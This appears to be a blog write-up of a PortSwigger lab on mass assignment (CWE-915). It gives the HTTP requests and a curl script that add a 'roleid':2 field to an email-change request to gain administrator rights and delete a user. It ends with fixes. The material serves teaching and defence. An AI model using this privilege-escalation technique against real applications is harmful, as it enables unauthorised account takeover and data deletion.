---
layout: post
title: "PortSwigger: User Role Can Be Modified in User Profile"
date: 2027-09-23 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, mass-assignment, privilege-escalation, over-posting, role-id, admin-panel, cwe-915]
---

The [previous lab](/posts/portswigger-user-role-controlled-by-request-parameter/) trusted a role value the client *sent* in a cookie. This one is the mirror image: the server lets the client *write* the role value into its own database record. It's [mass assignment](https://cwe.mitre.org/data/definitions/915.html) ([CWE-915](https://cwe.mitre.org/data/definitions/915.html)) — sometimes called over-posting — and the giveaway is sitting right there in plain sight in an API response.

## Overview

The lab gives you a normal account (`wiener:peter`) with an "update email" feature, and an admin panel at `/admin` that only administrators may reach. The objective: escalate `wiener` to administrator and delete the user `carlos`.

## The tell

Log in, go to your account page, and update your email. The form submits JSON to `POST /my-account/change-email`. Send a perfectly ordinary request:

```
POST /my-account/change-email HTTP/2
Content-Type: application/json

{"email":"wiener@normal-user.net"}
```

and read what comes back:

```json
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "54mlFuM0EX5b1OmCOW7pxjeRzCMevYYg",
  "roleid": 1
}
```

You only sent an email — but the server handed back your **entire user object**, including `"roleid": 1`. That echo is the whole vulnerability in one line. It means the data you *send* and the data the server *stores* are the same shape, and the server is binding your JSON straight onto the user record. If `roleid` comes out, there's a good chance it goes back in.

## The technique

Resend the request with the role field added:

```
POST /my-account/change-email HTTP/2
Content-Type: application/json

{"email":"wiener@normal-user.net","roleid":2}
```

The response:

```json
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "54mlFuM0EX5b1OmCOW7pxjeRzCMevYYg",
  "roleid": 2
}
```

`roleid` is now `2` — administrator. The server bound the extra field without ever asking whether you were allowed to set it.

With the elevated role, `/admin` is now yours. Delete `carlos`:

```
GET /admin/delete?username=carlos HTTP/2
```

```
HTTP/2 302
```

The lab flips to **solved**.

A full curl run, cookie jar shared throughout:

```bash
U="https://YOUR-LAB-ID.web-security-academy.net"

# log in
csrf=$(curl -sk -c cookies.txt "$U/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b cookies.txt -c cookies.txt \
  -d "csrf=$csrf&username=wiener&password=peter" "$U/login"

# observe the roleid echo
curl -sk -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"email":"wiener@normal-user.net"}' "$U/my-account/change-email"

# self-promote
curl -sk -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"email":"wiener@normal-user.net","roleid":2}' "$U/my-account/change-email"

# use it
curl -sk -b cookies.txt "$U/admin/delete?username=carlos"
```

## Why it worked

The change-email handler deserializes the request body directly onto the user model — think `user.update(req.body)` in an ORM — with no allow-list of which fields a user may actually change. `roleid` is an authorization-bearing field, yet it's left client-writable alongside the harmless `email`. Echoing the full object back in the response makes the flaw discoverable: it both leaks the bindable schema and signals that the same schema is writable.

This is the same root cause whether the extra field lives in a hidden form input at signup (`Acctype=2`), a JSON API body (`is_superuser:true`), or a query string — the server is binding fields the user was never meant to control.

## The fix

- **Bind an explicit allow-list.** This endpoint should accept only `email` and silently drop every other key.
- **Never accept authorization fields from the client.** Derive `roleid`, `isAdmin`, `acctype` from server-side session state only.
- **Don't echo sensitive internal fields** (`roleid`, `apikey`) back in API responses.
- **Authorize `/admin` independently** of the role value as defence in depth.
